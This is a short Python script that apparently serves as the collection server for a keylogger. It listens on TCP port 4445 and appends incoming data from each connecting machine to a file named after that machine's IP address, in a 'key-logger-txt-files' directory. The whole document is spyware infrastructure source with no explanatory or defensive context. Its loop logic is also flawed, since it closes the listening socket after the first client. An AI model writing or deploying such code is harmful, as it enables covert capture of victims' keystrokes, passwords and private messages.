import socket
import subprocess
import os
import sys

PORT = 4445
HOST = ""
SOCKET_CLIENTS = []
BUFFER_DATA = 4096


def sniff_the_key():
    socket_sever = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_sever.bind((HOST, PORT))
    socket_sever.listen(1)
    while True:
        os.chdir("key-logger-txt-files")
        client_socket, client_address = socket_sever.accept()
        print("Got connection from ", client_address[0])
        while True:
            data = client_socket.recv(BUFFER_DATA)
            if not data:
                print("Connection closed")
                break
            else:
                file = open(client_address[0], "ab")
                file.write(data)
                file.close()
        socket_sever.close()


if __name__ == "__main__":
    sniff_the_key()
